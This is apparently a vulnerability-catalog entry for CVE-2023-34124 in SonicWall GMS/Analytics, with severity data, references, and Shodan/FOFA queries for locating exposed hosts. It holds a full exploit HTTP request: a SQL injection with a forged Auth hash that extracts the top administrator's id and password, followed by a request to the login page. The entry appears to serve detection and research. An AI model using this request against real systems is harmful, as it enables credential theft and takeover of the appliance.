---
layout: post
cve_id: CVE-2023-34124
title: SonicWall GMS and Analytics Web Services - Shell Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-34124.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34124.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access,
  data leakage, and potential compromise of the target system.

  '
remediation: 'Apply the latest security patches or updates provided by SonicWall to
  mitigate this vulnerability.

  '
reference:
- https://raw.githubusercontent.com/rapid7/metasploit-framework/4b130f5be7590d04878f3bda37555e59e733324d/modules/exploits/multi/http/sonicwall_shell_injection_cve_2023_34124.rb
- https://attackerkb.com/topics/Vof5fWs4rx/cve-2023-34127/rapid7-analysis
- https://www.sonicwall.com/support/product-notification/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of-vulnerabilities/230710150218060/
- https://github.com/getdrive/PoC/blob/main/2023/Sonicwall_Shell_Injection/sonicwall_shell_injection_cve_2023_34124.rb
- https://nvd.nist.gov/vuln/detail/CVE-2023-34124
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-34124
  cwe-id: CWE-287,CWE-305
  epss-score: 0.91038
  epss-percentile: 0.99616
  cpe: cpe:2.3:a:sonicwall:analytics:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: sonicwall
  product: analytics
  shodan-query: http.favicon.hash:-1381126564
  fofa-query: icon_hash=-1381126564
tags:
- cve2023
- cve
- sonicwall
- shell
- injection
- auth-bypass
- instrusive
- vkev
- vuln
---

## üîç Vulnerability Description
The authentication mechanism in SonicWall GMS and Analytics Web Services had insufficient checks, allowing authentication bypass. This issue affects GMS: 9.3.2-SP1 and earlier versions; Analytics: 2.5.0.4-R7 and earlier versions


## üåê HTTP Request
```nohighlight
GET /ws/msw/tenant/%27%20union%20select%20%28select%20ID%20from%20SGMSDB.DOMAINS%20limit%201%29%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%28select%20concat%28id%2C%20%27%3A%27%2C%20password%29%20from%20sgmsdb.users%20where%20active%20%3D%20%271%27%20order%20by%20issuperadmin%20desc%20limit%201%20offset%200%29%2C%27%27%2C%20%27%27%2C%20%27 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Auth: {"user": "system", "hash": "/J50ZtvLJddOf5FI4nYdMJcX8IQ="}
Accept-Encoding: gzip
```

```nohighlight
GET /appliance/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

